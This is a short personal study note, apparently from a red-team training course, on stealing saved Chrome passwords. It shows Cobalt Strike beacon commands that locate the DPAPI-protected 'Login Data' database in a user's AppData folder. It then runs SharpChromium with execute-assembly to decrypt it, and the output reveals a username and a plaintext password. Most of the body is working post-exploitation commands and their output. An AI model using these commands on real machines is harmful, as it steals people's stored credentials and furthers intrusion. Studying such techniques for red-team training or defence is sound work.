---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Chrome Passwords]]  
___

## Description:  
Chrome stores DPAPI-protected credentials in a local SQLite database, which can be found within the user's local `AppData` directory.
```
beacon> ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 40kb     fil     02/25/2021 13:21:18   Login Data
```

A non-null `Login Data` file is a good indication that credentials are saved in here. [SharpChromium](https://github.com/djhohnstein/SharpChromium) is my go-to tool for decrypting these.
```
beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

[*] Beginning Google Chrome extraction.

--- Chromium Credential (User: bfarmer) ---
URL      : 
Username : bfarmer
Password : Sup3rman

[*] Finished Google Chrome extraction.
[*] Done.
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (10:09 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
